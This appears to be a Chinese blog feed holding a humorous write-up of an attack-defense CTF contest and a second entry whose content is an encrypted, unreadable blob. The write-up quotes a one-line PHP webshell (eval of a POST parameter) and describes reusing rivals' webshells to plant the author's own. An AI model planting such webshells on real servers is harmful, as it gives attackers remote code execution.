src="https://s3.bmp.ovh/imgs/2021/10/8bbbe66a1fd13c56.png"></p><blockquote><p>第一眼，这平台看着还挺好看？</p><p>再看一眼，确实好看，而且这HardCccc应该是个pwn题，我们pwn手有事干了（窃喜</p><p>总觉得哪里少点啥，再看一眼，nm，token都给我了，只能手动交flag？</p></blockquote><p>为了避免我个人以小人之心度君子之腹，于是哥们请教了众多运维小哥哥中的几位</p><blockquote><p>我：咱们平台有flag提交的api吗？</p><p>A：（疑惑脸）啥？</p><p>（我们俩看向B）</p><p>B：（故作镇定）怎么啦，平台有什么问题吗？</p><p>我：咱们平台flag提交的api在哪里呢？</p><p>B：（疑惑脸看向A）啥？</p><p>A：你说的是啥意思？</p><p>我：（无奈）咱们平台这个只能手动提交flag吗？</p><p>A：是的是的</p><p>B：手动交，要手动提交的</p></blockquote><p>这波啊，这波是我不懂事，明明主办方写平台都那么辛苦了，我居然还要求用api提交，<del>罪该万死</del></p><p>小事而已嘛，哥们自己改改脚本不就好了，找主办方的麻烦属于是我在这挑刺</p><p>帮队友调完ip之后，突然瞄见了自己前一天晚上写的<code>flowcopy.py</code>，于是打算起身去到运维组问问比赛给不给流量</p><blockquote><p>我：那个，我想问一下，咱们比赛的时候给流量吗</p><p>A：（看向B）他问给流量吗？</p><p>B：（不解）啥流量？</p><p>我：就是交互流量啊</p><p>B：有的，有的，都是能访问到的</p></blockquote><p>有人在致敬，但我不说是谁（逃</p><p>座位上发了会呆聊了会天，听主持人说了半天才知道，今天这比赛分两部分，高职组是解题，本科组是攻防，但大家坐在一个大厅，<del>说了半天什么谁可以联外网，谁不能外网……反正说了一大堆也没听懂</del></p><p>于是干等了一个小时比赛就开始了<del>（好像有哪个领导讲了点话，还宣布了比赛开始好像？</del></p><h3 id="比赛期间"><a href="#比赛期间" class="headerlink" title="比赛期间"></a>比赛期间</h3><p><strong>一句话总结：欢迎大家来到仙界！</strong></p><p>俩web一pwn，有半小时的加固时间，打算先去备份源码，下载完了之后打算看一眼主页长啥样，地址一输，俩题打开都是迎面而来的<code>Index of /</code>，于是哥们果断举手，结果主办方坚定的告诉我这题就这样，我心想完蛋了，这下web题都看不懂了，这不是得给达成筛子？算求，看不懂就看不懂，哥们只管打人就行了</p><h4 id="web1-SuperOA"><a href="#web1-SuperOA" class="headerlink" title="web1 SuperOA"></a>web1 SuperOA</h4><p>半小时加固时间一过，去看看别人的站长啥样，地址一访问之后给我看傻了，别人的站都有是模有样的登录界面，就我们是个空站，哥们于是自信举手跟运维组反应</p><blockquote><p>“您好，我们的环境和别人的不一样”</p><p>“啥意思？”</p><p>“你看我们的站一个php文件都没有”</p><p>“……”</p><p>“这个现在的index还是我自己写上去的”</p><p>“那你这就把index覆盖了啊”</p><p>“不是，我们这一个php都没有，我自己闲的没事干把自己站删了？连主页都没有不是要给check down？”</p><p>“……没事，你这文件夹都在，你继续加固就行”</p><p>“？这难道不是你们的问题？”</p><p>（转头离开）</p><p>“主页都没有你告诉我让我加固？”</p><p>（走远了）</p></blockquote><p>经过了多次尝试，确实发现是一点办法都没有，于是扣了50分重置，结果重置完我们自己的账号没权限，然后运维又调了好久我才有权限备份和上传，<del>（上面已经全是来自各地的🐎了）</del>，然后上了个waf，一打开，鬼鬼，警告日志直接给我弹满了，然后挂着waf抄流量，打了一圈之后我发现人均watchbird<del>（？真就waf大乱斗？</del></p><p>抄了几个payload，发现还是有憨憨没上waf，反正薅羊毛，大家一起薅</p><p>然后回服务器上准备删马，随手cat了几个看看都长啥样，突然看见有个<code>shell.php</code>，cat出来，直白的写着<code>eval($_POST[&#39;1&#39;]);</code></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>现在人种马都不带密码的？</p></blockquote><p>反手骑着别人的马把自己的马种了上去，这波啊，这波是瞎猫碰见死耗子，<del>然后有了自己的马之后就为所欲为了</del>，20个队给我种上了9个，这位老哥属于是带功臣（逃</p><p>有个功能全开的waf在，基本全给拦下来了，最后就剩下几个删不掉的不死马，但是我也没办法了（</p><h4 id="web2-Baseflask"><a href="#web2-Baseflask" class="headerlink" title="web2 Baseflask"></a>web2 Baseflask</h4><p>这题更是有意思，从头到尾整个站都是空的，<del>里面除了别人的shell再啥也没有（？</del></p><p>我看了半天实在是不知道要怎么搞，然后没办法，反手来一个<code>find / -name &quot;*.php&quot;</code>，结果整个服务器上啥也没有，然后随手敲了个<code>find . -name &quot;*flag*&quot;</code>，突然发现除了flag文件还有个二进制文件叫<code>readflag</code>，于是下载下来拖进IDA看了一眼，伪代码大概如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">freopen</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">cin &gt;&gt; flag;</span><br><span class="line">cout &lt;&lt; flag;</span><br></pre></td></tr></table></figure><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>这又是个啥？这不是web题吗？</p></blockquote><p>然后看了一眼参赛手册，上面写着**”系统开放端口则需自行查看”**，于是哥们赶紧叫队友扫一下靶机开了哪些端口，有个9999，反手一连直接弹出来了个flag</p><p><del>nc就送flag，端口不回收，nc自由，我系Dawn_whisper，十月九日下午两点，和我一起大战领航杯（雾</del></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>web题为啥给我开了个TCP服务？还是直接给flag那种？</p></blockquote><p>叫pwn手修好了之后，试着拿这种办法打一下别人的机子，好家伙，不打不知道，一打吓一跳，哥们一分钟写出来的exp，一次性打了17个flag（如图</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/f5d4fc0cb33a1c26.png"></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p></blockquote><p><del>这exp直到最后一轮都还能打17个靶机，我严重怀疑这是pwn题（</del></p><h4 id="pwn-HardCccc"><a href="#pwn-HardCccc" class="headerlink" title="pwn HardCccc"></a>pwn HardCccc</h4><p>四个小时，全场零解，我的评价是：寄！</p><h4 id="关于平台"><a href="#关于平台" class="headerlink" title="关于平台"></a>关于平台</h4><p><del>只能说，除了看起来还行，没有一点点优点</del></p><p>连一次自己靶机要一分钟，上去就看见CPU利用率98%<del>（麻了</del>，然后自己还没权限<del>（麻中麻</del></p><p>本平台极度流畅，因为只要你访问太多次就判断你是恶意攻击</p><p>本平台极度友好，因为你根本看不到自己靶机有没有被打</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/50960cdbe6244e67.png"></p><p>本平台极度智能，因为该平台可以随时生成奖状，自己需要即刻随时下载</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/61e4f84cc51f4bec.png"></p><p>本平台极度负责，因为我们根本不进行题目check，所以根本不会有人被check down！</p><p>下午四点多哥们就发现自己web1的MySQL库又给别人扬了，但是还没check down，直到比赛快结束了才进行了人工check扣分，而且根据主持人所说，”扬了数据库属于违规行为，需要你们溯源，找到是谁扬了你们的数据库他们就会被扣除一千分”</p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>自己没修好被扬数据库算违规？而且还靠选手溯源找凶手（高，实在是高.jpg</p></blockquote><h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><p>全程靠waf大乱斗和几个马，还有理解不了的nc拿flag，迷迷糊糊打了个第五，<del>混了个二等奖（？</del></p><h2 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h2><p>微信推送</p><blockquote><p>本次竞赛由江苏天创科技公司自主研发的产品“天创红客训练营安全攻防实战竞赛平台”提供技术平台支持。</p><p>CnHongKe平台已广泛应用到政企单位以及各大赛事的平台支持中，帮助政府、金融、通信、公共安全、能源等关键信息基础设施行业选拔网络安全人才，培养更多网络安全技术人员，江苏天创红客训练营将继续打造国内公益赛事，为提高国内红客人员技能贡献微薄力量！</p></blockquote><p>我只能说，____</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>蚌埠住了，还是蚌埠住了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021领航杯&quot;&gt;&lt;a href=&quot;#2021领航杯&quot; class=&quot;headerlink&quot; title=&quot;2021领航杯&quot;&gt;&lt;/a&gt;2021领航杯&lt;/h1&gt;&lt;h2 id=&quot;初赛&quot;&gt;&lt;a href=&quot;#初赛&quot; class=&quot;headerlink&quot; title=&quot;初</summary>
      
    
    
    
    <category term="Life" scheme="http://example.com/categories/Life/"/>
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>AWD框架</title>
    <link href="http://example.com/2021/06/26/AWD%E6%A1%86%E6%9E%B6/"/>
    <id>http://example.com/2021/06/26/AWD%E6%A1%86%E6%9E%B6/</id>
    <published>2021-06-26T11:42:06.000Z</published>
    <updated>2022-03-30T08:23:42.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="89a9b5c70df2b8f52e194663b4545b536acd34e0a842b703934fd80be0bd36f2">18c28b7435ad413414fae5c4e7392415fef5d21d70ae6608b3875c77f23b34c4ea8517b8741363af6be728ef131bca796e9d364f2a6f7d1d574bdf28fee440ad8bcc7c97a2bcb1139be04f9dcf4f6baa1acea157ee01c9a346a50b4ab622d359dda751e6b80bf5fcb9e2c9fa19465d1f92c07e2bc31a15c33639e234a231c7233cd72f77bbd803c14910d0713ed75a4e58e9f57e533ec85a5603a0ba17e795d8289d505db00608c012296b89004e6be6029e7a318587ee1dd04a31dc65e5e3a7a9ba47f41b0992579382309303d7d5e4055761405bad62e17d7a1dd10a6f343f19955cf5569c2b33a5ce1e45c95af275214beec7e5dbacfba81e8c671c9c281ba0be71498d7172b8c8d95dfa8ae232a614963dd2c59be1cd1114209038934afc966920b893f88cbf73c69c38996094a6ee836312630a1776220fb3061d0bd4a41ec57afd64d063a92163f98ed58996eb2e514ca8121e2d78f97f1177ac2535ca0f20ac84a866b3f7e6dfd1d544af1476a1d8ba573d20121a1bc716cb8508794c35df332cccb0b12e8b28d5810421f2d7cf907462700e1a664894e69d6cb9754dfb63cb2d0a74fccc2c17323fc10fabf9eec675357dbda893d03ef01c46aefd9e330ebdda4b7ea45125f29bb7388eb11c2cb6a003fb1781ae63bcfd41e6d55e031c87e4b1d97fc1856130b29e886953c88886e2a350cddf5c460ed4c662151c8722bc9ed8dd2564b659c808f052d747990ef2c075eb152705d8cbdaafe0bea01c8eb5868cac7a6c05948c6fd691a21ad54c86fa70331e9b9baada13d85cb5af1f4b12fc2a78edc3f559a58582e8e982d3cf4efc04b789f316faa11050eb712e7b964d637804804e81154069e1d170d97c0ffc0707fa24325d7071ba9929e9c8dc627f63395d50a1cf615a2c9494d6d7f8a959a7f678ca8de02297204c11b0eb8a76921fe507730030648715308bbf7dedae2834f40803f3fe79b4f38d61dbc9f36a66d0ca186363696ad941a43e547700f60a00e004395b1f529954de003c5c338e64e274b725e6df2a7a8c754bff09995fc65cdc52714021178caa81f423b72b6560be22077f722b6627466ed28f5443df0e24f60dd15c63c616160ca8d394ad2d0f865b2609c547892cad6e210e6ff08a85baa4dbeb0ff4173e869650d575d27f20f62223a81f9352379a372dcc53a7534cffe4e380b2fdb4e443b8e20738bc04a4e5b198f1c43159a37f33e3ae5b4f9fdc369c9e473956f8100737a5bc6b3be758caf4f2665694fe9414d7593b13ab2e1c43d397d4f92b0f3fde2f172949392a8e3d856aabce582bd78707c25f8a90d0ff1952f2d05b89d472036bad8081ca1e0bd1f0f5a2c1ea8eb9b79567379904159e8c45fbc4a74c6e8850868d9dfecff3746c7737c42309c79ff822b0ce1d4cd494b4f4adfc25fa20aade79277d1a9502cdcb5b04377c4898e3c6944348aacbe8b15ef977c2dcee80554212ab7af7a547e5617ef7599ad72a15a0f8a53837e289a326078ddb0476c1ac79121156b32319459b982f4a55e745fcfcd103bdd69a3cbded1c4d2d2a0be9f14648c8711c8230920cd6cd854228c8268227ce9cf950a13ac3e8313b5db770b3839301783163069d1b5f38f2a766396a92a6be90404f7222eff17798b093fddb8ae5f83478e7fecc4361e2e502a467905cd393f0d3055325f1383ae9e96212f426f3608a9324008964b5960a383a96ce30424cb9b0d9d4843eec8d41ae4a5e144cb7b11263cd1990f396c5d3068fb9bd70c9267fcd64c03280edb44c015f31d446044fc560248cb1b7e35fa3d9079bf00c1f7bdd103f0226a4dbbc7c53c4db4ff0040c8ec75e298c564397707103a9b8b6e53559b8dbe9f1e4b49c5f0ff2aa1ead8e2a3dc18a06bdb0688890ae5bece65c07c8be32d978be474c46bfa5bd3219d0dc8e586a0c4a26e272c374406a508b136db7ce4c6ad591d4b3d22bc93fa21741b6be0218597244227544adf8933f0f6598b7690a05eb00c656e1538b2a0b594d8cea0a4c4aef11f0f7af1d40470870e6b6d8a06229bed7c8a94726dbbb3c87c3cb105ff76415dfb9b1161bbee4ddc72188849148ae828f0038e55cd17a93651ec73ae2d237de27a27fa561c97a67f607fdd4736d9f20f22a722b36d9154418244bdd63090e8ec2c4d8b1f9e6d03cc37c355414802f0d33a2981b99b2349fb5aef602f1206e87686f1e024d1af85b9a21230eafddef4432de283178e88bd8c76c62f85a0b84af45c0a424e958d9342656d4da4c91ca00926ffea0a416358af778717c3ff142eddcd18c6fd6b5ab9b59b16970af15e7aadbadf72b8a46613320dcdfbd30d85640f85bfe69c8178841617bf1499dad420daaadb7d8eed37d439aea16260577fc81495efc4acd48d586f0b4dc8dea788f86cfa8f86ca608ac07ff14ec31965b272e2a8c6c35ced2369f75ff1a7981cf10617b1c35397cd7b196b1896d6cbf133a3de657b916d995a57550b2f397fd5bc73879d6294678714460ee8c9d9418af1d522fae3769b25eb9024f6e45c063fcbd74b42217ff2a8300d4d9cc8b67d5206654b1d0716a81cfe48af6b2babee0945f44367dfd3160049e662de1445312f6c7380a1a6fcb6e2fbefceafd63b7024a7eb1e995411e56f6286e939689b3030a53fe2431638bc6f5e6adb62662940cc913354a3faf247c88db0dc02d178d69c7d7f50c210bae0a92b47ebaf6f1364467a7f2841df9a154142c89d406353b6ac83ad0e12f0ef500c2b06260b02685a39b86db0d628cff5042b4970ffd89d56fa17c2f85c089c736c68983145eab3ffdfe2627f5cc38a4b258f76d512d50ff7f222e9ae9333652aa33f506003cc003f7481539eea4ec3b241c293d540f54bb087e37e152ef83b755b1a0b8058fd364ee8e419511a336ab5379513414a1a424da547302f4701cd9dfc39d9741bd0ce0b621becf10a7b2e87061ecebd667ccc0935e32f793aa6aa31c99d1bc26c72b7af8cd37de7948640014f6d7a1ad3f0bfc508421c2a9836da920ed382a9dc872f815806cbdd181a3ed8ee61b0978c6cfa2c4bdae32b36a79974118dc36dbd744d79a00567a5b99a499f9e3a4dd8f3645f342a99359efe836f130bf567c5baee611e7ee5212353d75564ff01423a637e1deb446a579ba82e929e5704729f013a5c333ef10b893b550d2ab41213cdd81fa2024ce33ecc20901445f4e807f85862c19fe830f3f60c11e99687610548e1087baaf80d2920f78faa3baf716569680885f6e809fa71a8974f1c50255e163bdd4ae25cc2d16294945a822307c98b4e8310b31d357c148b2fab33f6b86669a02050f8c9efe8ad85e52890fe46b43c84a77f76c7000789bbd4d2c5efaa6c15c100594c07f4d9b2d19278b74440f8ac75420f97b3ed9f1d1c9c4ab176ce7f62f4202717abcbc1064ac0100e267d7bae70ff3fa335e47ef7216a69bb8e4a6a74863bb31488d620cdaca05a67e77bd70c281d191596b39743b4c7509c9b9105562947e0c3cf2084719a7f2ab681c24d6b445c279054fa9dd9a5496be7f3ba92cc881a8dc4f83515c2c72238761099dd9e366bc4d522c694e33b68ce24e09b836c1cba681b7c89481d068f93584349d3a3a1f85e6992da6bd18a160e60c816582e64ca367100e266b9674c55c942f379fb171f52f43680b37e1aef1e5caf39ac5edc41ce3d70d42387111e9b68c34f3fa94b8035043e80cb38ff158a9d7bf014c135e701657181094402ce3356018fa639e6de292cd78a9b09d3543a4c21822ac7edabffc83975444fb69a18c333a3da955bf1d98da32a73dd8c132e2e0edb79b459b65d9fee6aeee01e5f9a2704699db12350350c4834b5f0bf296218f9f86f676a2436f0bad6d00430f973aeda1fe3b2016cedd4c48d96b9b75fd5ce462196f880f17baab461675796befeb6402c2a4348a2b32a9bcd205f98b72f913bb17feaf51b8d17f3eefcacd9401f234dcae4de7104c6fb59f095ae3bccf906acd909f1562aa285184babfe5735a102774baf5db8cb3de414e26b80092c2f32f84dd9b8b8cbbeb5ef4d0aec57a7819a61dd5a481b68258c5cba7417f1a7880f2209f94eef14cfb546cb14039ef1a1a1ee71543a542750eb39046cd703bfa66b6ab913653cdc0729b339cd219c5d46575ebce2576fd8c046ac70513b10becb56b5a088e089d264cb19dc612e8f033fe1f0be29b40e1964b39e64d0e491f3a7dca0019ef0232bfb1ce862a1c4057600dd7984757979ce4a1edb657df887f8cedd1d999e98f40d61ce43f0766d1e0be8644725bfc657d19da97d708899a176aa8cb1ee43226b2307baa4c44e9d2ab38d04d1ea930d3f6ffa1ba211d3dda272c652cf1664b48fd294cdb9b933695d4f806ba8f866b06bc9b5dbfa1c9979dbaf55a3cd4b541eb9602d9ec84052f3a8da186406c1d469b521851850b1102750834742966fbb9591c4e4d91bd200f76a2d8b0fc73ab261dccda0df714608b53ac9b28afdafc26c73acf5075f99fe5efc212410b119b7d3af97c7dc38a03d281c37838e80d01ef791d4e18d7ecb16de4c033e2d38ad34a554a83ccbe40d5a0f923614eb630306f953be8b959475b9e12b7f5a2daec99633d80ee4c5bd14bc70f8c93253486ca2ea8fc9e90048d1e6ed13210fda325156c0f0d5c66b2d9566152219b1abc59ee103565265e33c172ec438e774c5d97a075c428be0b8eb1491a9760a9452a7008061b47af8e0bed1cf28057e5f9cb91c75412079186a773c02efab02e18b7884172ba1b7421bc6fdbbef1f1dc750f0d4ce295226a5966968d051a74ae8090d75b0d93fd74d5a72caf7d583c353b6fdc14b6e2e03cec6dcb24ddc9d1a184a6d57ddf29f743a6dd85a1b8ee219fe358f7cb3c2cfb2d7ff68a686812b2ce84e3ad8f3991e70eb215dc28f7b0ceaee796a70f44505b1bea9e4d15855969fa4e52df417116ae64c74c91446099d9a0ec127106edc3cadfea94b18e7ab58ce1ac5a2b6204a5ab467e0e7c1691c5627ea2354a37e7252f199bd8e11ea2a3189ef1d8e44cd1d980a6abbe7cf05a5ead5f7315ec6b7bdc6e10cdd53c571f00e2c61c7d42a08da0dba7f8f55378b0c649e13726010b88503b7336b256ce7b35bb240660035a18d3a7aac6b742468d6109305a411e9336186fb43ed811862861ed0bd5b0baf91e28047ee05b875bdddd744f20a2b7489f5e7925e73fd42eceb90ad633774f8a959185511c94c1ecf412a520a3210744631f6104d05c3fbecb38f1bab598669cd8dc473a594b7d6e645bc489d2cd814cedc2a36dffce50c2734f03a21e509f4f6bd0564d7c90601e5cf922fc65b7959b3cac51e4d495215a3b36e1a6483bb6c9dac98d74a1de6ab45f55579cd6e8faf9762be1ed8707cde788cd1c3847902cb68aae8e6a9aea29390d1ae17e42f67fdd7636792dc0a174bdba728b3321ba0135edf22d5ea998a14b8e5224aaf84795ed8206135feec0a12e7f3b64056a0aaf1500ae2e49411bb2a6a72cf1099a8934757732349dcebbf83d922e4d6889aeb07d49c18015b1d4aada3d306eb6f8b703e8d9fe775456e590930ec6cc67945ee49c20278455932142ea5dc76c3c387a602ae00c053e036b44da0d2c2d692131def5384086b6a882bf4edeb704393801760fa42be4178ef59f15ec27d92ab9e963285c1d427465a2d1b6fb0144fb997cc22b879fc9379a20cd523da7a1f57c6bd7cdcea5a4e3fcf6eddd517ff01621f764194d8bf2522dfbb08346ff0db2b9db512814294c92d88839764668274b9a8a9dbbdba3ef6551ed7a95d6e5e106620dcd8bcbf1410fcd3f2c690ffec0bd1a9ef918d49800a839279615aae9166604e512d8aa57f4a63c34a0e9b15afdb5e46e1d78a1fe39b1f03cf4d0be7761364413ac9938858234cef0170a7ba06d0ddd48b7749a2d144f3b0be0a9ec8b9aa3c1a7aad92b0360337d3381809d7e3e850cac03bfdf3c6c452caab28fe51e4ef195288d681697746820f47dbb98e52ac8a88449c6126f1f5a1ff866420923a86502f6d63fefd6eff43976f4d03066901080a74e3a14c94bc01a844c3c9e93e8dfbb3d43c796a9b58dc8e9b6121240b5b1a3888ee89d087010bcf7eaadd9e794d4610087d505bf243b68c2ad88d5fbc374dd75649af42689afece9d0111ecd43cdd0772a3cff72f975eb780dede92839607d9f8b4a2c08882989cfe6d39f8af2223ccd6ea2924bd654899ddbd470efe064bd51d1f682868c28c0d2242bd63938faf54aea4b86437434a55a36f1bf112b7d094c14f12e4f769dbf59dc7d794ef53ff3a06d48613cb47cd7867b8781efcc78903ea0704b72aa1625728694416361c216bed0fa185c2a5bfea9fbd77e745e1b87e57cb85db29ad099e1e620fd4e98fdfee8667254e0b3687c81adfbb3c99932e1623e07da4a90fe35c6093f0ccb1a957f5cd9f6d39a9e89df55772a5920963f2a904e2bb1dea87a8c3bfd09937e98143aebe124c20bf36468e57a65a3d40bccfe8856dfdf897c46305b88c35942cd9bfd85b0c983f11896bdccb9575375db861dafdd2313f936c6f2c36ff82882a5b3cd409e40104808caeefbce5949c0352bc5299302b11c21133e618fe7e21a5d40e7217a493815e9ffc568f6a94539bd729f739f517fedb90a31cf9c527d0fe8fca63c868cb0159b392ee3bdc5473181dbc4b5a31b2d8c2cf648758da4c422b9b0bb7a2783e01307d3a3922a78c1351994830777a28ad2daf7509f5201818208575eaa446e9705bc2dc5144e31be0c72ea577ec2a9f3e2b2b42cb9a049c8a2f1ea5b6f43b24c4d455b26bd6a6b60fd5d69868e690257bc42c4c4ef5eeecdc008d9c4db172b42b3d9f36827624a102799797754ee562d625ae73834abf4d57d8396791543b9c96d28047dd91cb7eb348b19d9cf2987078a4e96a705c30829e649a637c4a34a1f43852f4d8b3d5eb1d54dfa2fbf0dc4e41c197e58d3bed8545b9608e0f2e8b75243e1e6d83923b17d59899974c6804e4cdb7c1055b71b43ee3f5d91ca14cd2d28309a32688e539f6979909d5fc571af1215303a60d0c857db9f0810303924d06300f449732756324c8af7d97132eb9d08e1981e039f02d09bdf5ccb4e97ba814ebd393fdb6aa30e77c76e5ebba1055704b86e95a16f13ec4c43d311f60850e2339849f943da5348961adff68c98742e3eba910e7371758444c7427bece8a825010236daa6f5876a1bdfa120cb9803ec79b696c141a196982bc3ad6df2aff06ea62b9e3c90a2785635555971a1ee2a0e43f57ec51cef26c17b130adcdb4d1ce506c51801b0c0a2b0fb48f8fb9220ec11db729d32a8b2120730989cd8f3d7f8ef54dc668f0d9b5e6f5634a66e49b3678f3ad7e46bb9dd2fa7abbe90e85852aa3fda06b189078ea81fb27deb6e4271b94fdb7e3252c3cf4335c8aafda3a49dfbba23bf2695f28305ee1e0e33fa6ea6668420316e34eeb2982aa15670aa5539ae348308f1dae0912e1d4f7c45d4c96d9bdf17e8cc80f11f1ede4f9a797b95b98d13e5107b5c1105d41d5dbb97a77459527957235073f086ba6159deef7be53a87637f057346cdc0ae3c85e4c5ab9df68b0c03f97815c56941fa6adf7ae68b0b595ca88474e97b5ae4a715d6d198485605ad854601441b0d204cbce24ea0c880ab6d0f5ce70dfc7b22034ef8c9d97e9dcdf4beba57d10646b9a1a8ed6c2aeb6c32335785d2536e560d12f363899d1595db7e0d36e680bffdb8810ec62e815b8015653391ddd24c2eb4501e3de81bb2d8a34004c609532a359e692505be1c2739f8b7242ca1dcc75c7c81d17f25d283ba5c91d356799ad8d96b8e91adca8b1006d8be7d80c205331d3e10859435efc546e4c61d3dbd2017ec796f302de3942dd3f40e36b6988767d89da8a1efe1d908069cb6f72a53d0c014cb73cda35a80ffc46d5d7ea8274be571b5b1a78715d5fbbc4941f57640836aea69b372fae337e35b8ebd59234b57aa1bf3721c9ea8e4f97bbc300d9a51a8261a95bba6a0da0262c56603aac5ce23cbf1ddffeb0647899a6a3aefe12289769901b28b87bfc75ccb15f736b4ce6c043dff86ec41f9b83af8fb72dd88be9a661461753f55b01389b2b1cbb02a9c37046648992acac1bdba288f0777d8c57dc12b490fc9dd15653c1307191617c2f14ed61787ae888f35b89790cf1fe585248b34f1bed93f51bbb7d6b8d145a7c2e28746ef98e31b786a49b8bdec46d31daa6fc5927fa5cc483af4bb9c7d80c19426ed803e8b1e3bbb80a3a915828cb77a3dbcb9699724fa0408e9b96bdec59fb99276994fb4d95d0c80429e709ac78dde2a758baa06679d8a6f9acc080097c2fc52483928a341a8c5ff1fca7c93b22cf1493fb53ae08bad124a4605629cbe61665c87f03599caccf5008d46145477f525203018384eabfc541b91b4b25513e06efbbe67419c521a09f3b413593f35a0a347e6071cd505b0085042fd644bee7e9a86d6993cab0a6df79519bb1b901489cd273e844a92b3a2946e33e00400e11465e887b0ca9a92654e9ca3746ccf0cbf742a0f90ceeb84d5f0b895ea5caa192f5b11989920af41e956ed5aae00ecceaf45043ada535cbc55ccc20f979b379ca0e506b2d507c71eee5384f91c1ef27497e5dc8a7184a3e41b13417f67c3690d11639186d7dd4a4a288f2c47cb5a1eae66dd4fc600e980443fd6ad2f652f2a422059fa0d0e9023f44cabc521b7e5ef0705cc095116dff0a794ebc24ce2170ef8b672de7a8cab9ddfcb40eff6b80580183a382540a1ff6f687b46f13066ad4681294838de0d3800613ccbdb60fb34e9dd71ba792967c22683fe3cea0d521ba9e1d41a01b98ccc3edff2d2d2303505664bdeecdd7a7c92eb61a35a330bafa2b83a916127e9c71e277d18eaf1f0c14e67e9d61d279acf42c74774164bb9197e5318581019d0bb711ccc0e963f3e69b525e11ad10568f894d59a2773e8f45feb11cc173dc6833a6eb9f94ed63503f400670adbdaba029180c17d0e827f4e9a1fb122b14f4e7ffc7382c85e34563bd2f591dfc23e3284e418c2f390fa5f47e45dd2a06dae2e58676378c515219fbf97a0540cbfb27d8cfbafa537d2ebdb74877f24f8df3f3a8c61592bb119dbe93e76db86994405abe5803ee0d67917217076cb80f5124b2b7334968b4822fbde2b61885de6fbf534431950d2cbdc30324af3008f7e6913f552b7a1498be6fd431d86fc6210ae12234d2dafe0c1a211f28074fc71c32f1cf527c726f2720decb2dcffdfffedd2771e07a30bd3b7316ce1b1d3564436ae4ebda052a297ceaecb98e128f837cb7a8abc9a945770e561bca0afc5688dd0f17bb5559d72211f666cdb40df53b04065963b47b81b0e88385c7960777d5bf06a1f65f3a36c81cb05cf1fabeff6ae1b6d66f7c3f21c464d735b1a9b7600528589d18ba137e9886363f3d19e4f40565a04a26c93d1a0a0705d04b7bbbece9d11d2dfe46dd2cc89b8c5c35bac8245894a9d61ce489aab7ac4eaec76f611fa06dd44464d8da663eee4f4e7c2ee4f42433c5013ea0d9f8ca9e5c9b6451fc1914a9bb24daee571db0a7e3772f1ab173c180276f6f4ea8114573ddba1d51551fa764df1e10f236c3e6216f09b3ef1e5cb79bbefbdf4aa502226e8886f8faa23af8a80a29bf73c4b70927acca99b6df5f5109db9e66a82ef5e52311723ec7e9403db9390bfe94cacbda6c5a4ddd20570acf661a0c9e34dcd395d03524ec53f7af223cb1c944c1c276f737e6e28b102d8afc5496d71c3f83761f81cc403ad5a5b95404af17fa9ce3b88c4545df202adb9f6f5cca4331268fce0b67c736e0b6f73eb1ccd765c4468ecb0909a99cbf20e486b377b47ab56fa7da801c31435d70da17c2586dac6e78cb69206194dec20da9ac78e2f3b6a18d5a649fb87a586dafb8d6a582c8c738d543bf9902609989b37cbcf2c8fab8ba2a908300de4ba55e225b4adea1f555ca3e40497f793a9af544047908bb8da797336beb39d08e55774e1a524c2cd5f36eb3aea1f1c5a040fd1b3ed0708682ac3947b2fab2c60de81cf836af49e0b7a83ef0666ff84fbee19ea611d54241ab0ec012bcdfc2b7e571238834247b86d2cf22ae6c6b642ce5c8c4f3e5a23a153a52ed2a51b99bbcc498a74ca719d6584a04605933a15a67027833a7cea09e37a55df463986b5a773dd35cd3565f812bf2101c23dd6429e20c37e7f16a559b561eb3aec6ae0d276b2e61997112509536624ddf5b991e55dc0f2ea7c0e79a269afbff46e01d6a1bee2f1fb3ac6b79dec1f819c7181d4f505fe93b554720cd73c03ab055d0fc08a690531cbac20fef1ff71ab9557f3e92861ea977cbb7a2af14afdce4d3081a0277d7d323728083dc0a39719bea10c91c4c5a715143b240fc068b951184049be57010c6b2d63c5ff472f016bf56af18144fdf36ef0e1fabd2e28177c4ae8a59fcd4797583f7de9a3e96e10deb0b0caa3e1f215a947de6b503fb4985ba2ab7764062fa430b970289cb1c4a42c6d8ab632f65e8367c57344ffa868bb6e5a9092d211d621608992e43b8ed5f0e0920220f936a9fb155ab6a0c8aa1edb89d144ab63ae459668cc6abe2cdb579ff991ceb94a0e0a92bdbca69e97fa050d920dee56bc3aa8d7adc2cc1a269cd402ea47a24722be7b3f5e2c772fcef924865a97d6ea78d32bc51a8f37df34b26142b45dbedb3f4c4b7fbddf4e7c94eddd8e61c44a1c1be4eb47045c25efc55a24528623d6b0a2af559a1bd2638f2a334f33546b03918635a73542a2aab9cad902e6514f67177f67a60667012f6aa235eeaf090b53dd4dba857c613f39d5f0376c12ac4bb08090f28a512af2765e52249b47b85f71e5b709d8bb032104e5c8dd8dd472acd2b9a12c2e04a558d5cdc281ec221f0e837c581dcd7e4fffec2734f16b06dd1e93e1fd66225e0510c061293540d5f4113df3081e8f72d65f1d6ecf1518798ce0da439ebe4b44c984bd60fe2bacf481d26561b465ffcb153a8a3d7e2184e7